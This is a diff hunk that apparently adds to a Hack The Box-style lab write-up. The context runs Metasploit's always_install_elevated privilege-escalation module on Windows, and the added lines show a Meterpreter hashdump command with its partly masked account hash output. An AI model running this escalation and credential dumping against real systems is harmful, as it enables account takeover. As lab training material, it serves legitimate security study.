@@ -409,3 +409,13 @@ use exploit/windows/local/always_install_elevated
 set SESSION <session_id>
 exploit
 ```
+```
+(Meterpreter 2)(C:\Windows\system32) > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxx:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxx:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxx:::
+htb-student:1002:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxx:::
+mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxx:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxx:::
+wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a9xxxxxxxxxx:::
+```
